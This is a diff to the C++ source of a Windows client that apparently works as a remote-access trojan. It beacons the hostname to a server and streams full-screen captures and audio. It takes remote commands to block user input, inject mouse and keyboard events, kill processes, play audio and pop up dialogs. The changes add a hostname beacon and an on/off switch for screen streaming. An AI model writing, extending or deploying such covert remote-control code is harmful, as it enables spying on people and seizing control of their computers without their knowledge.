@@ -47,6 +47,7 @@ static const GUID s_SUBTYPE_PCM={0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0
 static const PROPERTYKEY s_PKEY_FriendlyName={{0xa45c254e,0xdf1c,0x4efd,{0x80,0x20,0x67,0xd1,0x46,0xa8,0x50,0xe0}},14};
 
 static std::atomic<bool> g_CaptureRunning{false},g_StopCapture{false};
+static std::atomic<bool> g_Active{false}, g_Connected{false};
 static struct{std::string message;std::string buttons[3];int count;}g_DlgInfo;
 
 void SetVolume(int vol){CoInitialize(0);IMMDeviceEnumerator*pE=0;IMMDevice*pD=0;IAudioEndpointVolume*pV=0;if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE))&&SUCCEEDED(pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD))&&SUCCEEDED(pD->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pV)))pV->SetMasterVolumeLevelScalar(vol/100.0f,0);if(pV)pV->Release();if(pD)pD->Release();if(pE)pE->Release();CoUninitialize();}
@@ -69,7 +70,7 @@ void CaptureAndStream(bool systemAudio,int micDevIdx){g_CaptureRunning=true;SOCK
 void SendDeviceList(){SOCKET s=socket(AF_INET,SOCK_STREAM,0);sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT_DEVS);inet_pton(AF_INET,GetServerIP(),&a.sin_addr);if(connect(s,(sockaddr*)&a,sizeof(a))!=0){closesocket(s);return;}CoInitialize(0);IMMDeviceEnumerator*pE=NULL;CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);IMMDeviceCollection*pC=NULL;pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);UINT cnt=0;pC->GetCount(&cnt);int n=(int)cnt;SendAll(s,(char*)&n,4);for(int i=0;i<n;i++){IMMDevice*pD=NULL;pC->Item(i,&pD);IPropertyStore*pS=NULL;pD->OpenPropertyStore(STGM_READ,&pS);PROPVARIANT nm;ZeroMemory(&nm,sizeof(nm));pS->GetValue(s_PKEY_FriendlyName,&nm);char buf[256]={};if(nm.vt==VT_LPWSTR&&nm.pwszVal)WideCharToMultiByte(CP_ACP,0,nm.pwszVal,-1,buf,255,"?",NULL);int len=(int)strlen(buf);SendAll(s,(char*)&len,4);SendAll(s,buf,len);if(nm.vt==VT_LPWSTR&&nm.pwszVal)CoTaskMemFree(nm.pwszVal);pS->Release();pD->Release();}pC->Release();pE->Release();CoUninitialize();closesocket(s);}
 
 void CommandListener(SOCKET s){
-    while(true){
+    while(g_Connected){
         char cmd;if(recv(s,&cmd,1,0)!=1)break;
         if(cmd=='V'){int vol;if(!RecvAll(s,(char*)&vol,4))break;SetVolume(vol);}
         else if(cmd=='P'){int sz;if(!RecvAll(s,(char*)&sz,4))break;std::vector<char>buf(sz);if(!RecvAll(s,buf.data(),sz))break;char tmp[MAX_PATH];GetTempPathA(MAX_PATH,tmp);std::string f=std::string(tmp)+"nyx_remote.mp3";mciSendStringA("close nyx",0,0,0);std::ofstream out(f,std::ios::binary);out.write(buf.data(),sz);out.close();mciSendStringA(("open \""+f+"\" type mpegvideo alias nyx").c_str(),0,0,0);mciSendStringA("play nyx",0,0,0);}
@@ -80,6 +81,8 @@ void CommandListener(SOCKET s){
         else if(cmd=='R'){std::thread([](){SendProcessList();}).detach();}
         else if(cmd=='K'){DWORD pid;if(!RecvAll(s,(char*)&pid,4))break;KillProcess(pid);}
         else if(cmd=='F'){char on;if(recv(s,&on,1,0)!=1)break;BlockInput(on?TRUE:FALSE);}
+        else if(cmd=='1'){g_Active=true;}
+        else if(cmd=='0'){g_Active=false;BlockInput(FALSE);}
         else if(cmd=='m'){int x,y;if(!RecvAll(s,(char*)&x,4)||!RecvAll(s,(char*)&y,4))break;int sx=x*GetSystemMetrics(SM_CXSCREEN)/10000;int sy=y*GetSystemMetrics(SM_CYSCREEN)/10000;SetCursorPos(sx,sy);}
         else if(cmd=='c'){char btn,act;if(recv(s,&btn,1,0)!=1||recv(s,&act,1,0)!=1)break;DWORD fl=0;if(btn==0)fl=(act==0)?MOUSEEVENTF_LEFTDOWN:MOUSEEVENTF_LEFTUP;else if(btn==1)fl=(act==0)?MOUSEEVENTF_RIGHTDOWN:MOUSEEVENTF_RIGHTUP;else if(btn==2)fl=(act==0)?MOUSEEVENTF_MIDDLEDOWN:MOUSEEVENTF_MIDDLEUP;INPUT inp={};inp.type=INPUT_MOUSE;inp.mi.dwFlags=fl;SendInput(1,&inp,sizeof(INPUT));}
         else if(cmd=='k'){DWORD vk;char act;if(!RecvAll(s,(char*)&vk,4)||recv(s,&act,1,0)!=1)break;INPUT inp={};inp.type=INPUT_KEYBOARD;inp.ki.wVk=(WORD)vk;inp.ki.dwFlags=(act==1)?KEYEVENTF_KEYUP:0;SendInput(1,&inp,sizeof(INPUT));}
@@ -87,6 +90,7 @@ void CommandListener(SOCKET s){
         else if(cmd=='D'){int ml;if(!RecvAll(s,(char*)&ml,4))break;std::string msg;if(ml>0){std::vector<char>mb(ml);if(!RecvAll(s,mb.data(),ml))break;mb.push_back(0);msg=std::string(mb.data());}int nb;if(!RecvAll(s,(char*)&nb,4))break;g_DlgInfo.message=msg;g_DlgInfo.count=0;for(int i=0;i<nb&&i<3;i++){int bl;if(!RecvAll(s,(char*)&bl,4))break;std::string btn;if(bl>0){std::vector<char>bb(bl);if(!RecvAll(s,bb.data(),bl))break;bb.push_back(0);btn=std::string(bb.data());}g_DlgInfo.buttons[g_DlgInfo.count++]=btn;}std::thread([](){ShowDialogThread();}).detach();}
     }
     BlockInput(FALSE);
+    g_Connected = false;
 }
 
 int main(){
@@ -100,9 +104,25 @@ int main(){
         SOCKET sock=socket(AF_INET,SOCK_STREAM,0);if(sock==INVALID_SOCKET){Sleep(5000);continue;}
         sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&addr.sin_addr);
         if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0){
+            char hostbuf[256]={0};
+            gethostname(hostbuf, sizeof(hostbuf));
+            int hlen = strlen(hostbuf);
+            if(hlen == 0){ strcpy(hostbuf, "UnknownPC"); hlen = 9; }
+            send(sock, (char*)&hlen, 4, 0);
+            send(sock, hostbuf, hlen, 0);
+            
+            g_Active = false;
+            g_Connected = true;
             std::thread(CommandListener,sock).detach();
-            while(true){HDC hS=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hS);HBITMAP bmp=CreateCompatibleBitmap(hS,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hS,0,0,SRCCOPY);IStream*strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);{Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jc,&eps);}SelectObject(mem,oldB);DeleteObject(bmp);DeleteDC(mem);ReleaseDC(NULL,hS);STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE*data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);delete[]data;if(!ok)break;Sleep(150);}
+            while(g_Connected){
+                if(g_Active){
+                    HDC hS=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hS);HBITMAP bmp=CreateCompatibleBitmap(hS,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hS,0,0,SRCCOPY);IStream*strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);{Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jc,&eps);}SelectObject(mem,oldB);DeleteObject(bmp);DeleteDC(mem);ReleaseDC(NULL,hS);STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE*data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);delete[]data;if(!ok){g_Connected=false;break;}Sleep(150);
+                } else {
+                    Sleep(100);
+                }
+            }
         }
+        g_Active = false;
         closesocket(sock);Sleep(5000);
     }
     Gdiplus::GdiplusShutdown(gt);WSACleanup();return 0;
